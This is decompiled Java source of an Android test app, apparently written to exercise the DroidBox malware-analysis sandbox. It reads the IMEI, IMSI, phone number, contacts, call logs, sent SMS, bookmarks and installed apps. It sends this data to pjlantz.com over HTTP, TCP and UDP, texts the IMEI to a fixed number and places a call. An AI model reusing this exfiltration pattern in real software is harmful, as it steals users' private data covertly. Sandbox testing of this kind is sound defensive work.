// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   DroidBoxTests.java

package droidbox.tests;

import android.app.Activity;
import android.content.*;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Browser;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.*;
import java.net.*;
import java.security.*;
import java.util.Iterator;
import java.util.List;
import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;

// Referenced classes of package droidbox.tests:
//            SendDataService

public class DroidBoxTests extends Activity
{

    public DroidBoxTests()
    {
    }

    private String toHex(byte abyte0[])
    {
        StringBuffer stringbuffer = new StringBuffer();
        int i = 0;
        do
        {
label0:
            {
                int j = abyte0.length;
                if(i >= j)
                    return stringbuffer.toString();
                StringBuffer stringbuffer1;
                for(String s = Integer.toHexString(abyte0[i] & 0xff); s.length() < 2; s = (new StringBuilder("0")).append(s).toString())
                    break label0;

                stringbuffer1 = stringbuffer.append(s);
                i++;
            }
        } while(true);
    }

    public void onCreate(Bundle bundle)
    {
        super.onCreate(bundle);
        setContentView(0x7f030000);
        String s = System.setProperty("http.keepAlive", "true");
        setupTest();
        testSharedPreferences();
        testGetInstalledApps();
        testWriteFile();
        testReadFile();
        Intent intent = new Intent(this, droidbox/tests/SendDataService);
        android.content.ComponentName componentname = startService(intent);
        testCryptHash();
        testCryptAES();
        testCryptDES();
        testSendSocket();
        testSendDatagram();
        testNetworkHTTP();
        testSendSMS();
        testPhoneCall();
    }

    public void onDestroy()
    {
        Intent intent = new Intent(this, droidbox/tests/SendDataService);
        boolean flag = stopService(intent);
    }

    public void setupTest()
    {
        Cursor cursor;
        int k3;
        DroidBoxTests droidboxtests = this;
        String s = "phone";
        TelephonyManager telephonymanager = (TelephonyManager)droidboxtests.getSystemService(s);
        String s1 = telephonymanager.getDeviceId();
        imei = s1;
        String s2 = imei;
        encryptedImei = s2;
        String s3 = telephonymanager.getSubscriberId();
        imsi = s3;
        String s4 = telephonymanager.getNetworkOperatorName();
        String s5 = telephonymanager.getNetworkOperator();
        String s6 = telephonymanager.getNetworkCountryIso();
        String s7 = telephonymanager.getLine1Number();
        number = s7;
        String s8 = telephonymanager.getSimCountryIso();
        String s9 = telephonymanager.getSimOperatorName();
        String s10 = telephonymanager.getSimSerialNumber();
        String s11 = "";
        fileContent = s11;
        StringBuilder stringbuilder = new StringBuilder("BRAND: ");
        String s12 = Build.BRAND;
        String s13 = stringbuilder.append(s12).toString();
        int i = Log.v("Evasion", s13);
        StringBuilder stringbuilder1 = new StringBuilder("DEVICE: ");
        String s14 = Build.DEVICE;
        String s15 = stringbuilder1.append(s14).toString();
        int j = Log.v("Evasion", s15);
        StringBuilder stringbuilder2 = new StringBuilder("MODEL: ");
        String s16 = Build.MODEL;
        String s17 = stringbuilder2.append(s16).toString();
        int k = Log.v("Evasion", s17);
        StringBuilder stringbuilder3 = new StringBuilder("PRODUCT: ");
        String s18 = Build.PRODUCT;
        String s19 = stringbuilder3.append(s18).toString();
        int l = Log.v("Evasion", s19);
        StringBuilder stringbuilder4 = new StringBuilder("IMEI: ");
        String s20 = imei;
        String s21 = stringbuilder4.append(s20).toString();
        int i1 = Log.v("Evasion", s21);
        StringBuilder stringbuilder5 = new StringBuilder("IMSI: ");
        String s22 = imsi;
        String s23 = stringbuilder5.append(s22).toString();
        int j1 = Log.v("Evasion", s23);
        StringBuilder stringbuilder6 = new StringBuilder("Operator name: ");
        String s24 = s4;
        String s25 = stringbuilder6.append(s24).toString();
        int k1 = Log.v("Evasion", s25);
        StringBuilder stringbuilder7 = new StringBuilder("Operator code: ");
        String s26 = s5;
        String s27 = stringbuilder7.append(s26).toString();
        int l1 = Log.v("Evasion", s27);
        StringBuilder stringbuilder8 = new StringBuilder("Operator iso: ");
        String s28 = s6;
        String s29 = stringbuilder8.append(s28).toString();
        int i2 = Log.v("Evasion", s29);
        StringBuilder stringbuilder9 = new StringBuilder("SIM country code: ");
        String s30 = s8;
        String s31 = stringbuilder9.append(s30).toString();
        int j2 = Log.v("Evasion", s31);
        StringBuilder stringbuilder10 = new StringBuilder("SIM operator: ");
        String s32 = s9;
        String s33 = stringbuilder10.append(s32).toString();
        int k2 = Log.v("Evasion", s33);
        StringBuilder stringbuilder11 = new StringBuilder("SIM serial no: ");
        String s34 = s10;
        String s35 = stringbuilder11.append(s34).toString();
        int l2 = Log.v("Evasion", s35);
        StringBuilder stringbuilder12 = new StringBuilder("Phone nbr: ");
        String s36 = number;
        String s37 = stringbuilder12.append(s36).toString();
        int i3 = Log.v("Evasion", s37);
        String as[] = new String[2];
        as[0] = "title";
        as[1] = "url";
        Uri uri = Browser.BOOKMARKS_URI;
        cursor = managedQuery(uri, as, null, null, null);
        boolean flag = cursor.moveToFirst();
        Cursor cursor1 = cursor;
        String s38 = "title";
        int j3 = cursor1.getColumnIndex(s38);
        Cursor cursor2 = cursor;
        String s39 = "url";
        k3 = cursor2.getColumnIndex(s39);
_L7:
        if(!cursor.isAfterLast()) goto _L2; else goto _L1
_L1:
        String as1[] = new String[3];
        as1[0] = "date";
        as1[1] = "number";
        as1[2] = "duration";
        Uri uri1 = android.provider.CallLog.Calls.CONTENT_URI;
        String as2[] = new String[1];
        as2[0] = "60";
        cursor = managedQuery(uri1, as1, "duration<?", as2, "duration ASC");
        boolean flag1 = cursor.moveToFirst();
_L8:
        if(!cursor.isAfterLast()) goto _L4; else goto _L3
_L3:
        Cursor cursor3;
        String s40 = android.provider.Settings.System.getString(getContentResolver(), "next_alarm_formatted");
        settings = s40;
        Uri uri2 = Uri.parse("content://contacts/people");
        cursor3 = getContentResolver().query(uri2, null, null, null, null);
_L10:
        if(cursor3.moveToNext()) goto _L6; else goto _L5
_L5:
        Uri uri3 = Uri.parse("content://sms/sent");
        cursor3 = getContentResolver().query(uri3, null, null, null, null);
_L11:
        if(!cursor3.moveToNext())
            return;
        break MISSING_BLOCK_LABEL_1006;
_L2:
        Cursor cursor4 = cursor;
        int l3 = k3;
        String s41 = cursor4.getString(l3);
        bookmark = s41;
        boolean flag2 = cursor.moveToNext();
          goto _L7
_L4:
        int i4 = 0;
_L9:
label0:
        {
            int j4 = cursor.getColumnCount();
            if(i4 < j4)
                break label0;
            boolean flag3 = cursor.moveToNext();
        }
          goto _L8
        String s42 = String.valueOf(calls);
        StringBuilder stringbuilder13 = new StringBuilder(s42);
        Cursor cursor5 = cursor;
        int k4 = i4;
        String s43 = cursor5.getString(k4);
        String s44 = stringbuilder13.append(s43).append(" ").toString();
        calls = s44;
        i4++;
          goto _L9
_L6:
        String s45 = cursor3.getString(16);
        contactName = s45;
          goto _L10
        String s46 = cursor3.getString(2);
        phoneNbr = s46;
        String s47 = cursor3.getString(11);
        msg = s47;
          goto _L11
    }

    public void testAddBookmark()
    {
        int i = Log.v("Test", "[*] testAddBookmark()");
        ContentValues contentvalues = new ContentValues();
        Integer integer = Integer.valueOf(1);
        contentvalues.put("bookmark", integer);
        contentvalues.put("title", "Test");
        contentvalues.put("url", "http://www.pjlantz.com");
    }

    public void testCircPermission()
    {
        int i = Log.v("Test", "[*] testCircPermission()");
        StringBuilder stringbuilder = new StringBuilder("http://pjlantz.com/phone.php?phone=");
        String s = phoneNbr;
        Uri uri = Uri.parse(stringbuilder.append(s).toString());
        Intent intent = (new Intent("android.intent.action.VIEW", uri)).setFlags(0x10000000);
        startActivity(intent);
    }

    public void testCryptAES()
    {
        int i = Log.v("Test", "[*] testCryptAES()");
        Cipher cipher = Cipher.getInstance("AES");
        byte abyte0[] = KEY;
        SecretKeySpec secretkeyspec = new SecretKeySpec(abyte0, "AES");
        cipher.init(1, secretkeyspec);
        byte abyte1[] = imei.getBytes();
        byte abyte2[] = cipher.doFinal(abyte1);
        String s = toHex(abyte2);
        encryptedImei = s;
        Cipher cipher1 = Cipher.getInstance("AES");
        byte abyte3[] = KEY;
        SecretKeySpec secretkeyspec1 = new SecretKeySpec(abyte3, "AES");
        cipher1.init(2, secretkeyspec1);
        byte abyte4[] = cipher1.doFinal(abyte2);
_L2:
        return;
        printStackTrace();
        continue; /* Loop/switch isn't completed */
        printStackTrace();
        continue; /* Loop/switch isn't completed */
        printStackTrace();
        continue; /* Loop/switch isn't completed */
        printStackTrace();
        continue; /* Loop/switch isn't completed */
        printStackTrace();
        if(true) goto _L2; else goto _L1
_L1:
    }

    public void testCryptDES()
    {
        int i = Log.v("Test", "[*] testCryptDES()");
        Cipher cipher = Cipher.getInstance("DES");
        byte abyte0[] = KEY2;
        SecretKeySpec secretkeyspec = new SecretKeySpec(abyte0, "DES");
        cipher.init(1, secretkeyspec);
        byte abyte1[] = imei.getBytes();
        byte abyte2[] = cipher.doFinal(abyte1);
        String s = toHex(abyte2);
        encryptedImei = s;
        Cipher cipher1 = Cipher.getInstance("DES");
        byte abyte3[] = KEY2;
        SecretKeySpec secretkeyspec1 = new SecretKeySpec(abyte3, "DES");
        cipher1.init(2, secretkeyspec1);
        byte abyte4[] = cipher1.doFinal(abyte2);
_L2:
        return;
        printStackTrace();
        continue; /* Loop/switch isn't completed */
        printStackTrace();
        continue; /* Loop/switch isn't completed */
        printStackTrace();
        continue; /* Loop/switch isn't completed */
        printStackTrace();
        continue; /* Loop/switch isn't completed */
        printStackTrace();
        if(true) goto _L2; else goto _L1
_L1:
    }

    public void testCryptHash()
    {
        int i = Log.v("Test", "[*] testCryptHash()");
        MessageDigest messagedigest = MessageDigest.getInstance("MD5");
        byte abyte0[] = "Hash me".getBytes();
        messagedigest.update(abyte0);
        byte abyte1[] = messagedigest.digest();
        byte abyte2[] = "Hash me".getBytes();
        byte abyte3[] = messagedigest.digest(abyte2);
        MessageDigest messagedigest1 = MessageDigest.getInstance("SHA1");
        byte abyte4[] = "Hash me".getBytes();
        messagedigest1.update(abyte4);
        byte abyte5[] = messagedigest1.digest();
        MessageDigest messagedigest2 = MessageDigest.getInstance("SHA1");
        byte abyte6[] = imei.getBytes();
        messagedigest2.update(abyte6);
        byte abyte7[] = messagedigest2.digest();
        String s = toHex(abyte7);
        hashedImei = s;
_L2:
        return;
        printStackTrace();
        if(true) goto _L2; else goto _L1
_L1:
    }

    public void testGetInstalledApps()
    {
        int i = Log.v("Test", "[*] testGetInstalledApps()");
        List list = getPackageManager().getInstalledApplications(128);
        installedApps = "";
        Iterator iterator = list.iterator();
        do
        {
            if(!iterator.hasNext())
                return;
            ApplicationInfo applicationinfo = (ApplicationInfo)iterator.next();
            String s = String.valueOf(installedApps);
            StringBuilder stringbuilder = new StringBuilder(s);
            String s1 = applicationinfo.packageName;
            String s2 = stringbuilder.append(s1).append(":").toString();
            installedApps = s2;
        } while(true);
    }

    public void testNetworkHTTP()
    {
        HttpURLConnection httpurlconnection;
        int i = Log.v("Test", "[*] testNetworkHTTP()");
        httpurlconnection = null;
        URL url;
        StringBuilder stringbuilder = new StringBuilder("http://pjlantz.com/phone.php?phone=");
        String s = number;
        String s1 = stringbuilder.append(s).toString();
        url = new URL(s1);
        URL url1;
        httpurlconnection = (HttpURLConnection)url.openConnection();
        InputStream inputstream = httpurlconnection.getInputStream();
        InputStreamReader inputstreamreader = new InputStreamReader(inputstream);
        BufferedReader bufferedreader;
        for(bufferedreader = new BufferedReader(inputstreamreader); bufferedreader.readLine() != null;);
        bufferedreader.close();
        httpurlconnection.disconnect();
        StringBuilder stringbuilder1 = new StringBuilder("http://pjlantz.com/imei.php?imei=");
        String s2 = encryptedImei;
        String s3 = stringbuilder1.append(s2).toString();
        url1 = new URL(s3);
        httpurlconnection = (HttpURLConnection)url1.openConnection();
        InputStream inputstream1 = httpurlconnection.getInputStream();
        InputStreamReader inputstreamreader1 = new InputStreamReader(inputstream1);
        BufferedReader bufferedreader1;
        for(bufferedreader1 = new BufferedReader(inputstreamreader1); bufferedreader1.readLine() != null;);
        bufferedreader1.close();
        httpurlconnection.disconnect();
        StringBuilder stringbuilder2 = new StringBuilder("http://pjlantz.com/msg.php?msg=");
        String s4 = msg.replace(" ", "+");
        String s5 = stringbuilder2.append(s4).toString();
        url = new URL(s5);
        httpurlconnection = (HttpURLConnection)url.openConnection();
        InputStream inputstream2 = httpurlconnection.getInputStream();
        InputStreamReader inputstreamreader2 = new InputStreamReader(inputstream2);
        BufferedReader bufferedreader2;
        for(bufferedreader2 = new BufferedReader(inputstreamreader2); bufferedreader2.readLine() != null;);
        bufferedreader2.close();
        httpurlconnection.disconnect();
        StringBuilder stringbuilder3 = new StringBuilder("http://pjlantz.com/file.php?file=");
        String s6 = fileContent.replace(" ", "+");
        String s7 = stringbuilder3.append(s6).toString();
        url1 = new URL(s7);
        httpurlconnection = (HttpURLConnection)url1.openConnection();
        InputStream inputstream3 = httpurlconnection.getInputStream();
        InputStreamReader inputstreamreader3 = new InputStreamReader(inputstream3);
        BufferedReader bufferedreader3;
        for(bufferedreader3 = new BufferedReader(inputstreamreader3); bufferedreader3.readLine() != null;);
        bufferedreader3.close();
        httpurlconnection.disconnect();
        StringBuilder stringbuilder4 = new StringBuilder("http://pjlantz.com/settings.php?alarmset=");
        String s8 = settings.replace(" ", "+");
        String s9 = stringbuilder4.append(s8).toString();
        url = new URL(s9);
        httpurlconnection = (HttpURLConnection)url.openConnection();
        InputStream inputstream4 = httpurlconnection.getInputStream();
        InputStreamReader inputstreamreader4 = new InputStreamReader(inputstream4);
        BufferedReader bufferedreader4;
        for(bufferedreader4 = new BufferedReader(inputstreamreader4); bufferedreader4.readLine() != null;);
        bufferedreader4.close();
        httpurlconnection.disconnect();
        StringBuilder stringbuilder5 = new StringBuilder("http://pjlantz.com/call.php?logs=");
        String s10 = calls.replace(" ", "+");
        String s11 = stringbuilder5.append(s10).toString();
        url1 = new URL(s11);
        httpurlconnection = (HttpURLConnection)url1.openConnection();
        InputStream inputstream5 = httpurlconnection.getInputStream();
        InputStreamReader inputstreamreader5 = new InputStreamReader(inputstream5);
        BufferedReader bufferedreader5;
        for(bufferedreader5 = new BufferedReader(inputstreamreader5); bufferedreader5.readLine() != null;);
        bufferedreader5.close();
        httpurlconnection.disconnect();
        StringBuilder stringbuilder6 = new StringBuilder("http://pjlantz.com/app.php?installed=");
        String s12 = installedApps.replace(" ", "+");
        String s13 = stringbuilder6.append(s12).toString();
        url = new URL(s13);
        httpurlconnection = (HttpURLConnection)url.openConnection();
        InputStream inputstream6 = httpurlconnection.getInputStream();
        InputStreamReader inputstreamreader6 = new InputStreamReader(inputstream6);
        BufferedReader bufferedreader6;
        for(bufferedreader6 = new BufferedReader(inputstreamreader6); bufferedreader6.readLine() != null;);
        bufferedreader6.close();
        httpurlconnection.disconnect();
        httpurlconnection.disconnect();
        URL url2 = url;
_L1:
        return;
        IOException ioexception;
        ioexception;
_L4:
        ioexception.printStackTrace();
        httpurlconnection.disconnect();
          goto _L1
        Exception exception;
        exception;
_L3:
        httpurlconnection.disconnect();
        throw exception;
        exception;
        URL url3 = url;
        if(true) goto _L3; else goto _L2
_L2:
        ioexception;
        URL url4 = url;
          goto _L4
    }

    public void testPhoneCall()
    {
        int i = Log.v("Test", "[*] testPhoneCall()");
        Intent intent = new Intent("android.intent.action.CALL");
        Uri uri = Uri.parse("tel:123456789");
        Intent intent1 = intent.setData(uri);
        startActivity(intent);
    }

    public void testReadFile()
    {
        int i = Log.v("Test", "[*] testReadFile()");
        java.io.FileInputStream fileinputstream = openFileInput("myfilename.txt");
        if(fileinputstream == null) goto _L2; else goto _L1
_L1:
        BufferedReader bufferedreader;
        InputStreamReader inputstreamreader = new InputStreamReader(fileinputstream);
        bufferedreader = new BufferedReader(inputstreamreader);
_L7:
        String s = bufferedreader.readLine();
        if(s != null) goto _L3; else goto _L2
_L2:
        String s1 = fileContent;
        int j = Log.v("FileContent", s1);
        fileinputstream.close();
        fileinputstream = openFileInput("output.txt");
        if(fileinputstream == null) goto _L5; else goto _L4
_L4:
        InputStreamReader inputstreamreader1 = new InputStreamReader(fileinputstream);
        bufferedreader = new BufferedReader(inputstreamreader1);
        String s2 = String.valueOf(fileContent);
        String s3 = (new StringBuilder(s2)).append("&").toString();
        fileContent = s3;
_L9:
        s = bufferedreader.readLine();
        if(s != null) goto _L6; else goto _L5
_L5:
        fileinputstream.close();
_L8:
        return;
_L3:
        String s4 = String.valueOf(fileContent);
        String s5 = (new StringBuilder(s4)).append(s).toString();
        fileContent = s5;
          goto _L7
        printStackTrace();
          goto _L8
_L6:
        String s6 = String.valueOf(fileContent);
        String s7 = (new StringBuilder(s6)).append(s).toString();
        fileContent = s7;
          goto _L9
        printStackTrace();
          goto _L8
    }

    public void testSendDatagram()
    {
        int i = Log.v("Test", "[*] testSendDatagram()");
        InetAddress inetaddress = InetAddress.getByName("pjlantz.com");
        DatagramSocket datagramsocket = new DatagramSocket();
        byte abyte0[] = "Hello master via UDP".getBytes();
        int j = abyte0.length;
        DatagramPacket datagrampacket = new DatagramPacket(abyte0, j, inetaddress, 50010);
        datagramsocket.send(datagrampacket);
        byte abyte1[] = new byte[1024];
        int k = abyte1.length;
        DatagramPacket datagrampacket1 = new DatagramPacket(abyte1, k);
        datagramsocket.receive(datagrampacket1);
        datagramsocket.close();
_L2:
        return;
        printStackTrace();
        continue; /* Loop/switch isn't completed */
        printStackTrace();
        continue; /* Loop/switch isn't completed */
        printStackTrace();
        if(true) goto _L2; else goto _L1
_L1:
    }

    public void testSendSMS()
    {
        int i = Log.v("Test", "[*] testSendSMS()");
        SmsManager smsmanager = SmsManager.getDefault();
        android.app.PendingIntent pendingintent = null;
        android.app.PendingIntent pendingintent1 = null;
        smsmanager.sendTextMessage("0735445281", null, "Sending sms...", pendingintent, pendingintent1);
        SmsManager smsmanager1 = SmsManager.getDefault();
        String s = imei;
        android.app.PendingIntent pendingintent2 = null;
        android.app.PendingIntent pendingintent3 = null;
        smsmanager1.sendTextMessage("0735445281", null, s, pendingintent2, pendingintent3);
    }

    public void testSendSocket()
    {
        int i = Log.v("Test", "[*] testSendSocket()");
        Socket socket = new Socket("pjlantz.com", 50007);
        DataOutputStream dataoutputstream;
        java.io.OutputStream outputstream = socket.getOutputStream();
        dataoutputstream = new DataOutputStream(outputstream);
        DataInputStream datainputstream;
        InputStream inputstream = socket.getInputStream();
        datainputstream = new DataInputStream(inputstream);
        dataoutputstream.writeUTF("Hello master via TCP");
        String s = datainputstream.readUTF();
        socket.close();
        DataInputStream datainputstream1 = datainputstream;
        DataOutputStream dataoutputstream1 = dataoutputstream;
        Socket socket1 = socket;
_L1:
        return;
        Object obj;
        obj;
_L3:
        ((UnknownHostException) (obj)).printStackTrace();
          goto _L1
        obj;
_L2:
        ((IOException) (obj)).printStackTrace();
          goto _L1
        obj;
        Socket socket2 = socket;
          goto _L2
        obj;
        DataOutputStream dataoutputstream2 = dataoutputstream;
        Socket socket3 = socket;
          goto _L2
        obj;
        DataInputStream datainputstream2 = datainputstream;
        DataOutputStream dataoutputstream3 = dataoutputstream;
        Socket socket4 = socket;
          goto _L2
        obj;
        Socket socket5 = socket;
          goto _L3
        obj;
        DataOutputStream dataoutputstream4 = dataoutputstream;
        Socket socket6 = socket;
          goto _L3
        obj;
        DataInputStream datainputstream3 = datainputstream;
        DataOutputStream dataoutputstream5 = dataoutputstream;
        Socket socket7 = socket;
          goto _L3
    }

    public void testSharedPreferences()
    {
        int i = Log.v("Test", "[*] testSharedPreferences()");
        android.content.SharedPreferences.Editor editor = getSharedPreferences("Prefs", 1).edit();
        String s = imsi;
        android.content.SharedPreferences.Editor editor1 = editor.putString("SharedValue", s);
        String s1 = bookmark;
        android.content.SharedPreferences.Editor editor2 = editor.putString("Book", s1);
        boolean flag = editor.commit();
    }

    public void testWriteFile()
    {
        int i = Log.v("Test", "[*] testWriteFile()");
        java.io.FileOutputStream fileoutputstream = openFileOutput("myfilename.txt", 0);
        OutputStreamWriter outputstreamwriter = new OutputStreamWriter(fileoutputstream);
        outputstreamwriter.write("Write a line\n");
        outputstreamwriter.close();
        java.io.FileOutputStream fileoutputstream1 = openFileOutput("output.txt", 0);
        OutputStreamWriter outputstreamwriter1 = new OutputStreamWriter(fileoutputstream1);
        String s = String.valueOf(contactName);
        String s1 = (new StringBuilder(s)).append("\n").toString();
        outputstreamwriter1.write(s1);
        outputstreamwriter1.close();
_L2:
        return;
        printStackTrace();
        if(true) goto _L2; else goto _L1
_L1:
    }

    private static final byte KEY[];
    private static final byte KEY2[];
    private static final String PREFS_NAME = "Prefs";
    private String bookmark;
    private String calendar;
    private String calls;
    private String contactName;
    private String devicesn;
    private String encryptedImei;
    private String fileContent;
    private String hashedImei;
    private String iccd;
    private String imei;
    private String imsi;
    private String installedApps;
    private String msg;
    private String myPhone;
    private String number;
    private String phoneNbr;
    private String settings;

    static 
    {
        byte abyte0[] = new byte[16];
        abyte0[1] = 42;
        abyte0[2] = 2;
        abyte0[3] = 54;
        abyte0[4] = 4;
        abyte0[5] = 45;
        abyte0[6] = 6;
        abyte0[7] = 7;
        abyte0[8] = 65;
        abyte0[9] = 9;
        abyte0[10] = 54;
        abyte0[11] = 11;
        abyte0[12] = 12;
        abyte0[13] = 13;
        abyte0[14] = 60;
        abyte0[15] = 15;
        KEY = abyte0;
        byte abyte1[] = new byte[8];
        abyte1[1] = 42;
        abyte1[2] = 2;
        abyte1[3] = 54;
        abyte1[4] = 4;
        abyte1[5] = 45;
        abyte1[6] = 6;
        abyte1[7] = 8;
        KEY2 = abyte1;
    }
}
